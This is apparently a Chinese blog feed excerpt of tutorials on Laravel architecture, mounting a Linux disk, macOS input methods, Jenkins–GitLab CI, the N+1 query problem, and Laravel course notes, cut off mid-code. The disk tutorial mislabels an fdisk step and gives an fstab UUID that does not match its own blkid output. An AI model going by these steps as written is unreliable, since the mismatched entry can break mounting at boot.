功能越多，责任也越多，因此越违反单一职责原则，所以你应该将你的程式分割成更小的部分，每个部分都有它专属的功能，而不是一个 class 功能包山包海，也就是所谓的万能类别，所以整个方案不应该只有 MVC 三个部分，放手根据你的需求建立适当的目录，并将适当的 class 放到该目录下，只要我们的 class 有 namespace 帮我们分类即可。</p><h2 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h2><p>由于篇幅的关系，将 repository 独立成专文讨论，请参考如何使用 Repository 模式?</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>由于篇幅的关系，将 service 独立成专文讨论，请参考如何使用 Service 模式?</p><h2 id="Presenter"><a href="#Presenter" class="headerlink" title="Presenter"></a>Presenter</h2><p>由于篇幅的关系，将 presenter 独立成专文讨论，请参考如何使用 Presenter 模式?</p><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><p>由于现在 model、view、controller 的相依物件都已经拆开，也都使用依赖注入，因此每个部分都可以单独的做单元测试，如要测试 service，就将 repository 加以 mock，也可以将其他 service 加以 mock。</p><p>Presenter 也可以单独跑单元测试，将其他 service 加以 mock，不一定要跑验收测试才能测试显示逻辑。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>本文谈到的架构只是开始开始，你可以依照实际需求增加更多的目录与 class，当你发现你的 MVC 违反 SOLID 原则时，就大胆的将 class 从 MVC 拆开重构，然后依照以下手法 :</p><ol><li>建立新的 class 或 interface。</li><li>将相依物件依赖注入到 class。</li><li>在 class 內处理他的职责。</li><li>将 class 或 interface 注入到 controller 或 view。</li></ol><p>————————————————<br>版权声明：本文为CSDN博主「华尔街之猫」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_24935119/article/details/89656569" target="_blank" rel="noopener">https://blog.csdn.net/qq_24935119/article/details/89656569</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;初学者学习 Laravel 时分两种，一种是乖乖的将程式填入 MVC 架构內，导致 controller 与 model 异常的肥大，日后一样很难维护；一种是常常不知道程式改写在哪一个 class 內而犹豫不決，毕竟传统 PHP 都是一个页面一个档案。本文整理出适合 Laravel 的中大型项目架构，兼具容易维护、容易扩充与容易重复使用的特点，并且容易测试。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Linux 如何挂载新硬盘</title>
    <link href="https://www.0x2beace.com/how-to-mount-a-new-hard-disk-in-linux/"/>
    <id>https://www.0x2beace.com/how-to-mount-a-new-hard-disk-in-linux/</id>
    <published>2021-03-25T14:40:48.000Z</published>
    <updated>2021-03-25T14:42:08.365Z</updated>
    
    <content type="html"><![CDATA[<p>如何将一块新的硬盘挂载到Linux 操作系统呢？</p><a id="more"></a><p>下面以<code>Ubuntu 18.04</code>的发行版作为演示。</p><p>首先查看系统当前硬盘分配情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;dev &amp;&amp; ls sd* -al</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214146.png" alt=""></p><p>默认情况下，系统硬盘标记为<code>/dev/sda</code>，<code>sda1</code>、<code>sda2</code>这些表示对应硬盘下的分区名称。</p><p>查看当前系统硬盘挂载情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214212.png" alt=""></p><p>可以到看，该系统当前一共挂载了两块硬盘，分别是：</p><ol><li>分区名称为 <code>/dev/sda2</code>的系统盘 10G，挂载点为<code>/</code>。</li><li>分区名称为 <code>/dev/sdb1</code>的临时盘 2.5G，挂载点为<code>/mydata</code>。</li></ol><p>现在来为该系统添加第三块硬盘，并尝试挂载到指定目录。</p><h2 id="VirtualBox-添加磁盘"><a href="#VirtualBox-添加磁盘" class="headerlink" title="VirtualBox 添加磁盘"></a>VirtualBox 添加磁盘</h2><p>添加硬盘之前，需要先将机器给停掉，右键设置，点击存储</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214327.png" alt=""></p><p>创建虚拟盘：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214341.png" alt=""></p><p>按照默认选择VDI 就好：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214403.png" alt=""></p><p>根据自身情况，选择动态分配或者固定大小</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214421.png" alt=""></p><p>这里选择分配三个G，然后点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214503.png" alt=""></p><p>将新硬盘加入进来，然后启动机器。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214613.png" alt=""></p><h2 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h2><p>连接上机器之后，再次查看所有系统硬盘：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214640.png" alt=""></p><p>可以看到这次多了一个叫做<code>sdc</code> 的硬盘，首先需要对该硬盘进行分区，然后才能挂载。</p><p>这里我只需要新增一个主分区，执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (echo n; echo p; echo 1; echo ; echo ; echo w) | sudo fdisk &#x2F;dev&#x2F;sdc</span><br></pre></td></tr></table></figure><p>这条命令最终会做以下几件事情：</p><ol><li><code>echo n</code> 新增分区</li><li><code>echo p</code> 新建主分区</li><li><code>echo 1</code> 新增一个主分区</li><li><code>echo</code> 表示『回车』确定</li><li><code>echo 2</code> 写入并退出</li><li>将以上输出作为输出通过管道符传递给<code>fdisk</code>命令</li><li><code>/dev/sdc</code> 表示需要分区的硬盘</li></ol><p>将文件系统写入分区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkfs -t ext4 &#x2F;dev&#x2F;sdc1</span><br></pre></td></tr></table></figure><h2 id="挂载硬盘"><a href="#挂载硬盘" class="headerlink" title="挂载硬盘"></a>挂载硬盘</h2><p>将新硬盘挂载到指定目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mkdir &#x2F;boo &amp;&amp; sudo mount &#x2F;dev&#x2F;sdc1 &#x2F;boo</span><br></pre></td></tr></table></figure><p>再次使用<code>df -h</code>命令查看磁盘情况，可以到看新硬盘已经挂载到指定目录下了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214815.png" alt=""></p><p>最后记得设置开机挂载，使用<code>blkid</code> 命令获取硬盘UUID：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -i blkid</span><br></pre></td></tr></table></figure><p>输出内容类似：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dev&#x2F;sdc1: UUID&#x3D;&quot;f8025940-19bc-4943-9711-b431f478838e&quot; TYPE&#x3D;&quot;ext4&quot; PARTUUID&#x3D;&quot;d746a3a1-01&quot;</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/fstab</code> 文件，添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UUID&#x3D;9da67a01-aaae-4979-93fd-9916f010731a &#x2F;boo ext4 defaults 0 0</span><br></pre></td></tr></table></figure><p>至此就完成了硬盘挂载的所有操作了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/love__coder/article/details/8270856" target="_blank" rel="noopener">虚拟机VirtualBox怎么添加新的虚拟硬盘</a></li><li><a href="https://www.imooc.com/article/28638" target="_blank" rel="noopener">Azure: 给 ubuntu 虚机挂载数据盘</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;如何将一块新的硬盘挂载到Linux 操作系统呢？&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Ubuntu" scheme="https://www.0x2beace.com/categories/Linux/Ubuntu/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Ubuntu" scheme="https://www.0x2beace.com/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Mac 如何只保留一个输入法</title>
    <link href="https://www.0x2beace.com/how-to-keep-only-one-input-method-on-mac/"/>
    <id>https://www.0x2beace.com/how-to-keep-only-one-input-method-on-mac/</id>
    <published>2021-03-20T01:27:00.000Z</published>
    <updated>2021-03-21T03:33:10.032Z</updated>
    
    <content type="html"><![CDATA[<p>macOS 默认自带的是英文输入法，虽然也有简体中文，不过词库不丰富，不太好用。一般会选择安装一个第三方的输入法，这时就会有两个输入法共存了。</p><a id="more"></a><p>常常会遇到的一个痛点就是多应用切换时，下一个输入法总是不确定，有时候是中文有时候是英文。</p><p>系统输入法切换的快捷方式是<code>Control + Space</code>，而落格输入法切换中英文又是<code>Shift</code>，这就导致总是需要来回切换，这一点就很烦。</p><p>这种情况下，如果只保留一个输入法，那就不会有这种困扰了。</p><p>但是系统并不允许我们删除默认的英文输入法，不过可以一些小手段来达到目的，具体步骤如下：</p><ol><li>删除多余的输入法，只保留默认的英文输入法和正在使用的输入法</li><li>把当前输入法切换到默认的英文输入法</li><li>把<code>~/Library/Preferences/</code>路径下的<code>com.apple.HIToolbox.plist</code>文件拷贝到桌面，用Xcode 打开，找到并删除<code>AppleEnabledInputSources</code>中<code>KeyboardLayout Name</code>为<code>US</code> 那一项，然后保存。</li><li>用修改后的文件替换<code>~/Library/Preferences/</code>路径下文件</li><li>重启电脑即可</li></ol><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210320090641.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://xdev.in/posts/remove-default-input-source/" target="_blank" rel="noopener">删除macOS自带的英文输入法</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;macOS 默认自带的是英文输入法，虽然也有简体中文，不过词库不丰富，不太好用。一般会选择安装一个第三方的输入法，这时就会有两个输入法共存了。&lt;/p&gt;</summary>
    
    
    
    <category term="Mac" scheme="https://www.0x2beace.com/categories/Mac/"/>
    
    <category term="Skill" scheme="https://www.0x2beace.com/categories/Mac/Skill/"/>
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/tags/Skill/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins + Gitlab 持续集成</title>
    <link href="https://www.0x2beace.com/jenkins-gitlab-continuous-integration/"/>
    <id>https://www.0x2beace.com/jenkins-gitlab-continuous-integration/</id>
    <published>2021-03-16T14:27:42.000Z</published>
    <updated>2021-03-17T14:56:26.907Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Jenkins 是什么？</p></blockquote><p>Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具。</p><a id="more"></a><blockquote><p>Jenkins 如何与Gitlab 进行关联？</p></blockquote><p>可以通过生成密钥（Webhooks 的钩子），然后到Gitlab 需要集成的项目中，设置集成功能，增加Web 钩子。</p><p>这样当进行Push 动作时，就会触发Jenkins 进行构建，然后执行相应的流水线。</p><p>对于小公司而言，开发服务器常用的架构是内网服务器（本地机器）+外网服务器内网穿透，Jenkins + 私有Gitlab 持续集成。</p><p>背景：Jenkins 和Gitlab 部署在外网服务器上，通过内网穿透对内网服务器（开发服务器）进行访问。<br>需求描述：每次进行Push 时，触发Jenkins 流水线，进行构建，将最新的版本同步到开发服务器上。</p><p>Jenkins的功能很强大，这里并不打算深入拓展，而是介绍一种相较简单粗暴的方式去完成持续集成。</p><h2 id="创建任务"><a href="#创建任务" class="headerlink" title="创建任务"></a>创建任务</h2><p>首先需要在Jenkins 上新建任务，因为需求并不复杂，这里直接选择流水线的方式</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316144137.png" alt=""></p><p>如果需要关联TAPD，这里需要「关联TAPD」填上对应TAPD 的ID。</p><p>核心的配置在构建触发器这一块，根据Push 事件，触发执行流水线。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316144851.png" alt=""></p><p>有以下几个点需要注意：</p><ol><li>因为是开发服务器，并没有开启合并请求。</li><li>Gitlab webhook URL 需要记住，后面会用到。</li><li>默认允许所有分支，如果有特殊需求，可以指定分支名进行过滤。</li><li>点击右下角的Generate 按钮生成Secret token，后面会用到。</li></ol><p>配置流水线：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316220105.png" alt=""></p><p>上半部分是连接内网服务器（开发服务器）的基础信息，下半的配置信息是需要执行的构建脚本。</p><p>构建脚本的作用其实就是去执行<code>git pull</code> 这个动作，大概长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">pull() &#123;</span><br><span class="line">    cd &#x2F;var&#x2F;www&#x2F;project &amp;&amp; git pull</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pull</span><br></pre></td></tr></table></figure><details><summary>流水线配置，点击查看详情信息</summary><pre>def bdService() {    def remote = [:]    remote.name = 'hostname'    remote.host = 'localhost'    remote.port = 22    remote.user = 'username'    remote.password = 'password'    remote.allowAnyHosts = true    return remote}pipeline {    agent any    stages {        stage('代码集成') {            steps {                script {                    def  remote = bdService();                    sshCommand remote: remote, command: "/bin/bash /opt/shell/build.sh"                }            }        }    }}</details><p>配置完成之后，点击保存。</p><p>返回工作态，找到对应任务，点击立即构建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316220845.png" alt=""></p><p>通过构建历史，查看<code>Console Output</code>，能看到类似输出则表示构建成功。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316220912.png" alt=""></p><p>构建成功之后，就可以与Gitlab 进行关联了，点击项目=&gt;设置=&gt;集成。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316220941.png" alt=""></p><p>链接（URL）是之前的 Webhook url，安全令牌则是上面生成的 Secret token，SSL 证书验证视情况选择是否开启，然后点击增加Web 钩子。</p><p>至此所有的配置就基本完成了，这时可以去测试Push，看看是否会执行自动构建。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Jenkins 是什么？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具。&lt;/p&gt;</summary>
    
    
    
    <category term="运维" scheme="https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Jenkins" scheme="https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/Jenkins/"/>
    
    
    <category term="运维" scheme="https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="CI" scheme="https://www.0x2beace.com/tags/CI/"/>
    
    <category term="Jenkins" scheme="https://www.0x2beace.com/tags/Jenkins/"/>
    
    <category term="CD" scheme="https://www.0x2beace.com/tags/CD/"/>
    
  </entry>
  
  <entry>
    <title>什么是 N+1 问题，以及如何解决</title>
    <link href="https://www.0x2beace.com/what-is-the-n-1-problem-and-how-to-solve-it/"/>
    <id>https://www.0x2beace.com/what-is-the-n-1-problem-and-how-to-solve-it/</id>
    <published>2021-03-15T14:10:11.000Z</published>
    <updated>2021-03-17T04:42:49.315Z</updated>
    
    <content type="html"><![CDATA[<p><code>N+1</code> 是ORM（对象关系映射）关联数据读取中存在的一个问题。</p><a id="more"></a><p>在介绍什么是<code>N+1</code>问题之前，首先思考一个问题：</p><p>假设现在有一个用户表（User）和一个余额表（Balance），这两个表通过<code>user_id</code>进行关联。现在有一个需求是<strong>查询年龄大于18岁的用户，以及用户各自的余额</strong>。</p><p>这个问题并不难，但对于新手而言，可能常常会犯的一个错误就是在循环中进行查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18)-&gt;select();</span><br><span class="line">foreach($users as $user)&#123;</span><br><span class="line">  $balance &#x3D; User::getFieldByUserId($user-&gt;user_id, &quot;balance&quot;);</span><br><span class="line">  $user[&#39;balance&#39;] &#x3D; $balance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样做是非常糟糕的，数据量小还少，在数据量较大的情况下，是非常消耗数据库性能的。</p><p>通过Mysql 查询日志，可以看到查询用户表是一次，因为有四个符合该条件的用户，查询用户表关联的余额表是四次。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210314132050.png" alt=""></p><p><code>N+1</code>问题就是这样产生的：查询主表是一次，查询出N 条记录，根据这N 条记录，查询关联的副（从）表，共需要N 次。所以，应该叫<code>1+N</code> 问题更合适一些。</p><p>其实，如果稍微了解一点SQL，根本不用这么麻烦，直接使用<code>JOIN</code> 一次就搞定了。</p><p>对于这类问题，ORM 其实为我们提供了相应的方案，那就是使用『预加载功能』。</p><h3 id="预加载功能"><a href="#预加载功能" class="headerlink" title="预加载功能"></a>预加载功能</h3><p>使用<code>with()</code>方法指定想要预加载的关联：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18)</span><br><span class="line">-&gt;with(&quot;hasBalance&quot;)</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure><p><code>hasBalance</code> 是什么呢？</p><p>它是在<code>User</code>模型中定义的一个方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class User extends Model</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;  ...</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; User模型与Balance 模型进行一对一关联</span><br><span class="line">    public function hasBalance()</span><br><span class="line">    &#123;</span><br><span class="line">      return $this-&gt;hasOne(Balance::class, &quot;user_id&quot;, &quot;user_id&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这个方法让<code>User</code> 模型与<code>Balance</code> 模型进行一对一关联。</p><p>现在再来看一下Mysql 的查询日志：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210314133535.png" alt=""></p><p>可以很清楚的看到，总查询次数由原来的<code>1+N</code> 变成了现在的<code>1+1</code>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>N+1</code> 问题是什么？会造成什么影响？应该如何解决？</p><ol><li>执行一次查询获取N 条主数据后，由于关联引起的执行N 次查询从数据</li><li>带来了不必要的查询开销</li><li>可以通过框架 ORM 自带的<code>with</code> 去解决</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;N+1&lt;/code&gt; 是ORM（对象关系映射）关联数据读取中存在的一个问题。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
    <category term="ThinkPHP" scheme="https://www.0x2beace.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>L01 Laravel 教程- Web 开发实战入门课程笔记</title>
    <link href="https://www.0x2beace.com/laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/"/>
    <id>https://www.0x2beace.com/laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/</id>
    <published>2021-03-14T04:10:01.000Z</published>
    <updated>2021-03-15T14:18:15.623Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://learnku.com/courses/laravel-essential-training/8.x" target="_blank" rel="noopener">L01 Laravel 教程- Web 开发实战入门</a>课程笔记。</p><a id="more"></a><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p>构建应用（8.*）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ composer create-project laravel&#x2F;laravel weibo --prefer-dist &quot;8.*&quot;</span><br></pre></td></tr></table></figure><p>构建应用（5.*）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ composer create-project laravel&#x2F;laravel Laravel --prefer-dist &quot;5.7.*&quot;</span><br></pre></td></tr></table></figure><p>Ubuntu 中查看所有PHP 版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ update-alternatives --display php</span><br></pre></td></tr></table></figure><p>Ubuntu 中快速切换PHP 版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo update-alternatives --config php</span><br></pre></td></tr></table></figure><p>工作原理：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210314120650.png" alt=""></p><p>注意事项：</p><ol><li>路由的服务提供者类中设置命名空间</li><li><code>blade.php</code> 是Laravel 的一套模版引擎，有自己的一套规则，通过继承父视图，可以减少很多重复代码</li><li><code>art tinker</code> 是 Laravel 框架自带的命令，用以调出 Laravel 的交互式运行时</li></ol><h2 id="artisan-命令"><a href="#artisan-命令" class="headerlink" title="artisan 命令"></a>artisan 命令</h2><p><a href="https://learnku.com/docs/laravel/6.x/artisan" target="_blank" rel="noopener">Artisan</a> 是 Laravel 提供的 CLI（命令行接口）。</p><p>常用命令如下：<br>|命令|说明|<br>|-|-|<br>|php artisan key:generate|生成App Key|<br>|php artisan make:controller|生成控制器|<br>|php artisan make:model|生成模型|<br>|php artisan make:policy|生成授权策略|<br>|php artisan make:seeder|生成Seeder 文件|<br>|php artisan migrate|执行迁移|<br>|php artisan migrate:rollback|回滚迁移|<br>|php artisan migrate:refresh|重置数据库|<br>|php artisan db:seed|填充数据库|<br>|php artisan migrate:refresh –seed|进行数据库迁移同时填充数据库|<br>|php artisan tinker|进入tinker 环境|<br>|php artisan route:list|查看路由列表|</p><h2 id="第一章学到了什么"><a href="#第一章学到了什么" class="headerlink" title="第一章学到了什么"></a>第一章学到了什么</h2><ul><li>如何构建一个Laravel 应用</li><li>对新建的Laravel 项目进行基本配置</li><li>手动创建控制器、静态视图</li><li>了解路由、控制器、视图的基本协作方式</li><li>了解如何使用通用视图</li><li>了解Artisan 命令的基本使用</li></ul><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ composer require laravel&#x2F;ui:^3.0 --dev</span><br></pre></td></tr></table></figure><p><code>composer require</code> 命令是用来安装扩展包的命令，参数<code>--dev</code>表示仅仅只在开发环境中使用。</p><p>上面命令安装完成之后，使用以下命令来引入 bootstrap：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan ui bootstrap</span><br></pre></td></tr></table></figure><p>建议使用<code>yarn</code>命令代替<code>npm</code> 命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yarn install</span><br></pre></td></tr></table></figure><p>前端代码编译出现问题时，可以尝试将<code>node_moudles</code>文件夹删除，再次安装相关依赖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm run watch-poll</span><br></pre></td></tr></table></figure><p>上面这条命令的作用其实就是监视前端文件变化，如果有变化的话，就马上编译。</p><blockquote><p>生成环境中，为什么不用一直开启这个命令？</p></blockquote><p>这是因为服务端只需要手动编译一次就好，也就是使用<code>npm run dev</code>命令。</p><p>之所以说Laravel 是全栈框架，就是因为它在一个项目中把前端和后端所有东西都包揽了。</p><h3 id="Laravel-的前端工作流"><a href="#Laravel-的前端工作流" class="headerlink" title="Laravel 的前端工作流"></a>Laravel 的前端工作流</h3><p>Laravel 的前端工作流是通过 Sass、NPM、Yarn、Laravel Mix 构成一套前端工作流。</p><ul><li><code>Sass</code> 是一种可用于编写CSS 的语言。</li><li><code>Yarn</code> 是一个用于代替NPM 客户端的新的包管理器。</li><li><code>Laravel Mix</code> 是一个前端任务自动化管理工具。<code>Laravel Mix</code> 可以自动编译<code>resources</code>下面的文件。</li><li><code>双括号</code> 是在Html 中内嵌PHP 的Blade 语法，表示包含在该区域内的代码使用PHP 来编译执行。</li></ul><h3 id="第二章学到了什么"><a href="#第二章学到了什么" class="headerlink" title="第二章学到了什么"></a>第二章学到了什么</h3><ol><li>Laravel 的前端工作流</li><li>局部视图的订单和引用</li><li>命名路由的定义和使用</li></ol><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="Eloquent-ORM"><a href="#Eloquent-ORM" class="headerlink" title="Eloquent ORM"></a>Eloquent ORM</h3><p>其特点是一个模型对应数据库中的一个表。</p><p>在进行数据库迁移时，<code>up</code> 方法会被调用，在进行数据库回滚时，<code>down</code>方法会被调用。</p><p>所以无论是初次创建表，还是后面增加字段，都需要去<code>up</code> 方法下进行定义，这样在数据库迁移时才会生效。</p><p>创建一张表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:migration create_followers_table --create&#x3D;&quot;followers&quot;</span><br></pre></td></tr></table></figure><p>增加一个字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:migration add_activation_to_users_table --table&#x3D;users</span><br></pre></td></tr></table></figure><p>数据库的回滚与迁移直接对应着 <code>databases</code> 文件夹下的迁移文件。</p><p>创建模型的同时并进行迁移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:model Model&#x2F;Articles -m</span><br></pre></td></tr></table></figure><p>可以使用以下命令进行数据库交互：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan tinker</span><br></pre></td></tr></table></figure><p>该命令可以进入Eloquent 模型，直接进行数据库交互。在该模式下，Eloquent 模型的方法均可以使用。</p><h3 id="第三章学到了什么？"><a href="#第三章学到了什么？" class="headerlink" title="第三章学到了什么？"></a>第三章学到了什么？</h3><ol><li>Eloquent 模型的定义与应用</li><li>数据库迁移与回滚（数据表生成与删除）</li><li>模型的创建与使用</li><li>tinker 的使用</li></ol><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><p>在本地可以这样访问Homestead 的数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uhomestead -h127.0.0.1 -P33060 -p &#x2F;&#x2F; 或者 mysql -uhomestead -h192.168.10.10 -P3306 -p</span><br></pre></td></tr></table></figure><p>但是在项目（Homestead）中，只能这样访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uhomestead -h127.0.0.1 -P3360 -p &#x2F;&#x2F; 或者 mysql -uhomestead -h192.168.10.10 -P3306 -p</span><br></pre></td></tr></table></figure><p>因为端口做了映射（Homestead 3306=&gt; 主机 33060），而项目又运行在Homestead 中，所以项目配置中的端口不能写成<code>33060</code>，否则无法正常访问。</p><h3 id="隐形路由绑定"><a href="#隐形路由绑定" class="headerlink" title="隐形路由绑定"></a>隐形路由绑定</h3><p>这个『隐形路由绑定』倒底是个啥玩意？简单理解就是通过控制器把模型绑定在路由中了。</p><p>路由代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&#39;&#x2F;users&#x2F;&#123;user&#125;&#39;, 